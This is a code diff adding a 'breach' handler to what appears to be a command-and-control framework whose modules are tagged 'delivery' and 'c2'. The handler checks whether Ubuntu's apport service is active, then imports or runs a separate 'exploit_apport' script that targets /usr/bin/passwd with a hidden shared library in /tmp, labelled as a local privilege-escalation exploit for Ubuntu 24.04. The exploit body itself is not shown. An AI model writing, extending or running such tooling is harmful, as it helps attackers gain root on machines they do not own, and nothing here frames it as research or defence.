@@ -532,6 +532,47 @@ def phantom_handler(params: dict):
     return handle_phantom(params)
 
 
+@registry.register("breach", "Breach-Entry — CVE-2026-XXXX apport ExecutablePath spoofing on Ubuntu 24.04", "1.0", "delivery",
+                     requires=["sudo"])
+def breach_handler(params: dict):
+    """Execute Breach-Entry exploit."""
+    target = params.get("target", "/usr/bin/passwd")
+    action = params.get("action", "exploit")
+    so_path = params.get("so_path", "/tmp/.libexploit.so")
+
+    result = {"action": action, "target": target, "status": "not_executed", "details": []}
+
+    if action == "check":
+        # Check if apport is running
+        try:
+            proc = subprocess.run(["systemctl", "is-active", "apport"], capture_output=True, text=True, timeout=5)
+            result["apport_active"] = proc.stdout.strip() == "active"
+        except Exception:
+            result["apport_active"] = False
+        result["status"] = "checked"
+
+    elif action == "exploit":
+        # Try to import and run the exploit
+        try:
+            sys.path.insert(0, os.path.join(PROJECT_ROOT, "core", "breach"))
+            import exploit_apport
+            success = exploit_apport.exploit(target)
+            result["status"] = "exploited" if success else "failed"
+            result["success"] = success
+        except ImportError:
+            # Run as subprocess
+            try:
+                cmd = ["python3", "core/breach/exploit_apport.py", target]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=PROJECT_ROOT)
+                result["output"] = proc.stdout[:1000]
+                result["status"] = "exploited" if proc.returncode == 0 else "failed"
+            except Exception as e:
+                result["status"] = "error"
+                result["error"] = str(e)
+
+    return result
+
+
 @registry.register("health", "Health check and module listing", "1.0", "c2")
 def health_handler(params: dict):
     """Health check with module listing."""
